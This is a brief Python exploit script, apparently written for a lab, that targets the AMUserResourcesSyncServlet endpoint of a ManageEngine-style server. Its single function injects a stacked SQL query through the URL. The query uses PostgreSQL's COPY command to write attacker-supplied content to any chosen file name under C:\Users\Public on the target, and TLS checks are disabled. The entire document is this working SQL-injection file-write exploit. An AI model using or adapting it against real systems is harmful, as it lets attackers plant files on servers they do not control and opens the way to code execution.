import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def write():
    if len(sys.argv) != 3:
        print("Usage: python3 test.py <filename> <content>")
        sys.exit(1)

    file = sys.argv[1]
    content = sys.argv[2]

    url = "https://192.168.109.113:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"

    payload = f";COPY (SELECT $$ {content} $$) TO $$C:\\Users\\Public\\{file}$$;--+"

    full_url = url + payload

    response = requests.get(full_url, verify=False)

    print("Status Code:", response.status_code)
    print("Response:", response.text)


if __name__ == "__main__":
    write()
